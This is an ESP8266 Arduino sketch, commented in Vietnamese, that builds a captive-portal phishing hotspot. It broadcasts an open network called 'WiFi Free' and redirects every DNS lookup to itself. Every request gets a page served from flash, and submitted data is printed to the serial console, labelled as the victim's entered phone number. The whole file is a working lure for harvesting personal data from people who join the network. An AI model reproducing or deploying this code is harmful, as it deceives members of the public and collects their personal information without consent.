#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

void setup() {
  // debug
  Serial.begin(115200);

  // LittleFS
  if (!LittleFS.begin()) {
    Serial.println("Failed to mount LittleFS");
    return;
  }

  //WiFi Access Point
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiFi Free");

  // dns server
  dnsServer.start(DNS_PORT, "*", apIP);

  // khai bao du lieu ngdung len serial monitor
    webServer.on("/sendData", HTTP_POST, []() {
    if (webServer.hasArg("plain")) {
      String data = webServer.arg("plain");
      Serial.println("So dien thoai da nhap: " + data);
      webServer.send(200, "text/plain", "Data received");
    } else {
      webServer.send(400, "text/plain", "No data received");
    }
  });

  // read file littefs , va luu file html
  webServer.onNotFound([]() {
    File file = LittleFS.open("/web.html", "r");
    if (!file) {
      Serial.println("Failed to open captive.html");
      webServer.send(404, "text/plain", "File not found");
      return;
    }

    String html = "";
    while (file.available()) {
      html += file.readString();
    }
    file.close();

    webServer.send(200, "text/html", html);
  });

  // start web server
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}